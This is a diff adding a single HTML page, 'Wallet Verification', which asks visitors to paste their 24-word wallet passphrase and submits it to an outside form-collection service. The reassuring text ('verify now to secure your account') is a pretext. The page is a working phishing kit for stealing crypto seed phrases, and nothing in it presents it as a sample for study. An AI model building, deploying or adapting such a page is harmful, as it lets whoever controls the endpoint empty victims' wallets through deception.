@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallet Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f9f9f9;
+    }
+
+    h1 {
+      color: black;
+      text-align: center;
+    }
+
+    form {
+      max-width: 600px;
+      margin: 0 auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    textarea {
+      background-color: white;
+      width: 100%;
+      height: 120px;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      resize: vertical;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      background-color: purple;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    input[type="submit"]:hover {
+      background-color: red;
+    }
+
+    h5 {
+      font-weight: normal;
+      font-size: 14px;
+      color: #333;
+      margin-top: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Wallet Verification</h1>
+
+  <form action="https://formspree.io/f/mjkwdwkp" method="post">
+    <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+    <input type="submit" value="Unlock with Passphrase" />
+    <h5>
+      Verify now to secure your account and unlock full access.<br>
+      By verifying now, you protect your assets and ensure<br>
+      uninterrupted access to all features.
+    </h5>
+  </form>
+</body>
+</html>
